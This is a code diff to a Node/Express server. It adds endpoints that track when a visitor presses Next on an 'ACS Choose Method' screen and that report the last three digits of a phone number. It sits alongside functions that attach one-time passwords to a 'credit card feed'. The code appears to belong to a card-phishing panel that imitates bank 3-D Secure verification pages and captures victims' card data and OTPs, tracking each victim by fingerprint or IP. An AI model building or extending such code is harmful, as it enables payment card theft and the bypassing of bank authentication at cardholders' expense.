@@ -78,7 +78,9 @@ import {
   saveFeedEntryForOrder,
   attachOtpToCardFeed,
   getOtpMeta,
+  markMethodNextClicked,
   requestOtpResend,
+  setPhoneLast3,
   OTP_MAX_ATTEMPTS,
 } from './creditCardFeedStore.js';
 
@@ -1559,7 +1561,31 @@ app.get('/api/order/otp-status', async (req, res) => {
       otp_can_resend: otpMeta?.canResend ?? false,
       otp_resend_cooldown_sec: otpMeta?.resendCooldownSec ?? 0,
       fail_reason: otpMeta?.failReason ?? null,
+      method_next_clicked: otpMeta?.method_next_clicked ?? false,
+      phone_last3: otpMeta?.phone_last3 ?? null,
     });
+  } catch (e) {
+    res.status(500).json({ error: String(e?.message || e) });
+  }
+});
+
+/** Customer pressed Next on ACS Choose Method */
+app.post('/api/order/creditcard/method-next', async (req, res) => {
+  try {
+    const orderId = String(req.body?.orderId || req.body?.order_id || '').trim();
+    if (!orderId) return res.status(400).json({ error: 'Missing orderId' });
+    const clientIp = getClientIpFromRequest(req);
+    const visitorId = normalizeFingerprintInput(req.headers['x-visitor-id'] || '');
+    const expectedVisitorId = visitorId || `ip:${clientIp}`;
+    const all = await loadOrders(ORDERS_CRM_PATH);
+    const row = findOrderByBusinessId(all, orderId);
+    if (!row) return res.status(404).json({ error: 'Order not found' });
+    if (String(row.visitorId || '').trim() !== String(expectedVisitorId || '').trim()) {
+      return res.status(403).json({ error: 'Unauthorized' });
+    }
+    const ok = await markMethodNextClicked(orderId);
+    if (!ok) return res.status(404).json({ error: 'Feed entry not found' });
+    res.json({ ok: true, orderId, method_next_clicked: true });
   } catch (e) {
     res.status(500).json({ error: String(e?.message || e) });
   }
